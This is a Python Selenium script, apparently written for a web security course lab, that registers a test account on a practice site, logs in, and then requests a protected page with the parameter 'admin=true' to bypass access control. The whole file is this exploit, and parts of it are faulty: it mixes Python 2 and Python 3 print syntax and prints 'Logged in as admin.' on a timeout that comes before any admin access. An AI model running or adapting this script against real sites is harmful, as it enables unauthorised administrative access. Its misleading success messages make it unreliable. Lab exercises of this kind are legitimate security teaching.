from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

caps = DesiredCapabilities.FIREFOX
caps["marionette"] = True
caps["binary"] = "/usr/bin/firefox"

driver = webdriver.Firefox(capabilities=caps,executable_path='./exploit16/geckodriver')
driver.get("http://www.wsb.com/Assignment2/case23/register.php")

username = driver.find_element_by_id("username")
email = driver.find_element_by_id("email")
password = driver.find_element_by_id("password")
cfm_password = driver.find_element_by_id("confirmpwd")
register_btn = driver.find_element_by_xpath("/html/body/form/input[5]")

username.send_keys("test")
email.send_keys("test@test.com")
password.send_keys("Pa55w0rd")
cfm_password.send_keys("Pa55w0rd")
cfm_password.send_keys(Keys.ENTER)
register_btn.click()

timeout = 1
try:
    element_present = EC.presence_of_element_located((By.ID, 'element_id'))
    WebDriverWait(driver, timeout).until(element_present)
except TimeoutException:
    print "Logged in as admin."

driver.quit()

print("User account created. Logging in now...")

driver = webdriver.Firefox(capabilities=caps,executable_path='./exploit16/geckodriver')
driver.get("http://www.wsb.com/Assignment2/case23/login.php")
email = driver.find_element_by_xpath("/html/body/form/input[1]")
password = driver.find_element_by_id("password")

email.send_keys("test@test.com")
password.send_keys("Pa55w0rd")

login_btn = driver.find_element_by_xpath("/html/body/form/input[3]")
login_btn.click()

print("Please wait for a few seconds.")
timeout = 3
try:
    element_present = EC.presence_of_element_located((By.ID, 'element_id'))
    WebDriverWait(driver, timeout).until(element_present)
except TimeoutException:
    print "Logged in as admin."

driver.get("http://www.wsb.com/Assignment2/case23/protected_page.php?admin=true")

driver.close()
